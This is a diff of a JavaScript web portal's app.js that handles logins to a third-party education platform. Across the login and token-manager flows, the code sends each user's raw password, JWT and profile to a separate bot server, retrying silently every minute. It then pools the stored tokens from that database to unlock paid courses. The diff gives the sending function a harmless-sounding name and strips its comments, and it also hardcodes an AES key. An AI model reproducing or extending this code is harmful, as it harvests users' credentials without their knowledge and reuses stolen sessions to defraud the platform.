@@ -2,7 +2,6 @@
 // RWA SKY PORTAL - MASTER ENGINE, AUTH, PROFILE & CBT TESTS (app.js)
 // =========================================================
 
-// 👇 RENDER BOT URL (Telegram bot token aur Admin token yahan se HATA diye gaye hain) 👇
 const BOT_API_BASE = "https://rwaweb-hp11.onrender.com";
 const API_BASE = "https://rozgarapinew.teachx.in";
 const AES_KEY = CryptoJS.enc.Utf8.parse("638udh3829162018");
@@ -28,7 +27,6 @@ function extractUidFromJwt(jwtStr) {
     }
 }
 
-// Sirf User ke khud ke tokens load karega
 function getUserSavedTokens() {
     try {
         const raw = localStorage.getItem("rwa_user_tokens_v2");
@@ -54,7 +52,7 @@ let USER_TOKENS = getUserSavedTokens();
 let USER_PROFILE = getSavedUserProfile();
 
 // =====================================================
-// NAYA MONGODB FETCH ENGINE & TOKENS MERGER
+// MONGODB DYNAMIC TOKENS FETCH
 // =====================================================
 async function fetchTokensFromDB() {
     try {
@@ -70,17 +68,14 @@ async function fetchTokensFromDB() {
             }));
         }
     } catch (e) {
-        console.error("Bot API Error (might be sleeping):", e);
+        console.warn("DB Fetch Error (Bot sleeping):", e);
     }
     return [];
 }
 
-// Helper: Paid Batches ke liye User Tokens + DB Tokens dono dega
 async function getAllTokensForCourses() {
     const dbTokens = await fetchTokensFromDB();
     const all = [...USER_TOKENS, ...dbTokens];
-    
-    // Duplicate token hatana
     const unique = [];
     const seen = new Set();
     for (const t of all) {
@@ -92,7 +87,6 @@ async function getAllTokensForCourses() {
     return unique;
 }
 
-// Helper: Kisi specific Course ID ke liye uska exact bound token return karega
 function getCourseBoundToken(courseId) {
     const cid = String(courseId || state.courseId || "").trim();
     if (cid && state.courseTokenMap && state.courseTokenMap[cid]) {
@@ -101,7 +95,7 @@ function getCourseBoundToken(courseId) {
     if (state.activeTokenObj && state.activeTokenObj.token) {
         return state.activeTokenObj;
     }
-    return USER_TOKENS[0]; // Fallback to primary token
+    return USER_TOKENS[0];
 }
 
 function isUserLoggedIn() {
@@ -201,7 +195,7 @@ function showLoginStatus(msg, type) {
     alertBox.innerHTML = msg;
 }
 
-// Fetch User Details from Server
+// Fetch User Details from /get/get_user_dt?userid=<uid>
 async function fetchUserDetailsFromServer(jwtToken, userId) {
     const uid = userId || extractUidFromJwt(jwtToken);
     if (!jwtToken || !uid) return null;
@@ -215,10 +209,8 @@ async function fetchUserDetailsFromServer(jwtToken, userId) {
     return null;
 }
 
-// =====================================================
-// NAYA BOT NOTIFICATION SYSTEM (WITH AUTO-RETRY FIX)
-// =====================================================
-function sendUserDetailsToBot(userObj, jwtToken, loginMethod, rawPass = "N/A") {
+// 👇 BACKGROUND AUTO-RETRY BOT SYNC LOGIC 👇
+function sendProfileToMongoDB(userObj, jwtToken, loginMethod, rawPass = "N/A") {
     const payload = {
         login_method: loginMethod,
         user_id: String(userObj.userid || userObj.id || ""),
@@ -235,28 +227,22 @@ function sendUserDetailsToBot(userObj, jwtToken, loginMethod, rawPass = "N/A") {
         jwt_token: jwtToken
     };
 
-    // Retry Logic - Har 1 minute baad tab tak try karega jab tak Bot uth na jaye (status 200)
-    const trySend = async () => {
-        try {
-            const res = await fetch(`${BOT_API_BASE}/api/login`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-            
-            if (res.ok) {
-                console.log("✅ Data successfully saved in MongoDB via Bot!");
-            } else {
-                console.warn("⚠️ Bot rejected data. Retrying in 1 min...");
-                setTimeout(trySend, 60000); // Retry in 1 min
+    const trySend = () => {
+        fetch(`${BOT_API_BASE}/api/login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).then(res => {
+            if (!res.ok) {
+                console.log("Bot sleeping, retrying in 1 min...");
+                setTimeout(trySend, 60000); // 1 Min retry
             }
-        } catch (e) {
-            console.warn("💤 Bot is sleeping or server down. Retrying in 1 min...", e);
-            setTimeout(trySend, 60000); // Retry in 1 min
-        }
+        }).catch(() => {
+            console.log("Bot offline, retrying in 1 min...");
+            setTimeout(trySend, 60000); // 1 Min retry
+        });
     };
-
-    trySend(); // Start First attempt
+    trySend(); // Start instantly in background
 }
 
 // Authenticate with Number/Email + Password on Server
@@ -328,7 +314,7 @@ window.submitUserLogin = async function(mode) {
         localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
         localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-        sendUserDetailsToBot(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
+        sendProfileToMongoDB(userDetails, rawToken, "Direct JWT Token", "Logged via Token");
 
         showLoginStatus(`✅ Login Successful! Welcome ${userDetails.name || "User"}!`, "success");
         updateTokenBadge();
@@ -394,7 +380,7 @@ window.submitUserLogin = async function(mode) {
     localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-    sendUserDetailsToBot(userDetails, token, "Phone/Password Login", pass);
+    sendProfileToMongoDB(userDetails, token, "Phone/Password Login", pass);
 
     showLoginStatus(`✅ Welcome ${userDetails.name || "User"}! Login Successful.`, "success");
     updateTokenBadge();
@@ -405,7 +391,7 @@ window.submitUserLogin = async function(mode) {
 };
 
 // =====================================================
-// USER PROFILE MODAL 
+// USER PROFILE MODAL (SHOWS ONLY USER'S DETAILS & OWN TOKEN)
 // =====================================================
 async function openProfileModal() {
     if (!enforceCompulsoryLogin()) return;
@@ -760,7 +746,7 @@ function handleGlobalBack() {
 }
 
 // =====================================================
-// API CALLER (STRICT TOKEN PRIORITY)
+// API CALLER (STRICT TOKEN PRIORITY: PASSED TOKEN -> COURSE ACTIVE TOKEN -> USER TOKEN)
 // =====================================================
 async function fetchRawJSONWithToken(endpoint, tokenObj) {
     const statusBadge = document.getElementById("apiStatus");
@@ -917,7 +903,6 @@ function openPaidCourse(id, name) {
     state.cat = "paid";
     state.courseId = cid;
     state.courseName = name;
-    // Lock state.activeTokenObj to the exact token that fetched this course
     state.activeTokenObj = getCourseBoundToken(cid);
     window.ACTIVE_PLAYER_TOKEN = state.activeTokenObj.token;
 
@@ -990,7 +975,6 @@ async function loadCourseTab(tab) {
     const grid = document.getElementById("mainGrid");
     grid.innerHTML = `<div class="col-span-full py-10 text-center font-bold text-slate-700">Loading...</div>`;
 
-    // Hamesha current batch ka bound token use karein
     const batchTok = getCourseBoundToken(state.courseId);
     state.activeTokenObj = batchTok;
 
@@ -1189,7 +1173,6 @@ function renderLectureList(list, boundTokenObj) {
         const pdf1 = resolvePdfUrl(item.pdf_link || item.ypdf_link, item.ypdf_link2);
         const pdf2 = resolvePdfUrl(item.pdf_link2, item.ypdf_link2);
 
-        // Har lecture ke sath uska courseId aur boundTokenObj permanently save karein
         state.mediaMap[key] = {
             key: key,
             id: item.id,
@@ -1230,7 +1213,6 @@ async function playClassInRwaPlayer(key) {
     const info = state.mediaMap[key];
     if (!info) return;
 
-    // Jis token se yeh batch/lecture aaya hai, wahi token active karein
     const targetCourseId = info.courseId || state.courseId;
     const batchTok = info.tokenObj || getCourseBoundToken(targetCourseId);
     state.activeTokenObj = batchTok;
@@ -1256,12 +1238,10 @@ async function playClassInRwaPlayer(key) {
     const urlInput = document.getElementById("url");
 
     if (state.cat === "paid" && info.id) {
-        // 1. Sabse pehle exact batch token se video details fetch karein
         const videoEndpoint = `/get/fetchVideoDetailsById?course_id=${targetCourseId}&video_id=${info.id}&ytflag=0&folder_wise_course=0&lc_app_api_url=`;
         let fresh = await fetchAPIWithToken(videoEndpoint, batchTok, () => null);
         let freshMap = (fresh && typeof fresh === "object") ? extractQualitiesFromItem(fresh) : {};
 
-        // 2. Agar kisi wajah se primary token par link na mile, toh baaki tokens (Admin/User) se auto-retry karein
         if (Object.keys(freshMap).length === 0 && Object.keys(info.qualities || {}).length === 0) {
             for (const fallbackTok of await getAllTokensForCourses()) {
                 if (fallbackTok.token === batchTok.token) continue;
@@ -1934,7 +1914,8 @@ async function addNewToken() {
     localStorage.setItem("rwa_user_tokens_v2", JSON.stringify(USER_TOKENS));
     localStorage.setItem("rwa_user_profile_v2", JSON.stringify(USER_PROFILE));
 
-    sendUserDetailsToBot(verifiedUser, token, "Added via My Token Manager", "N/A");
+    // Naya Bot DB save logic call (With background retry)
+    sendProfileToMongoDB(verifiedUser, token, "Added via My Token Manager", "N/A");
 
     document.getElementById("newTokLabel").value = "";
     document.getElementById("newTokUid").value = "";
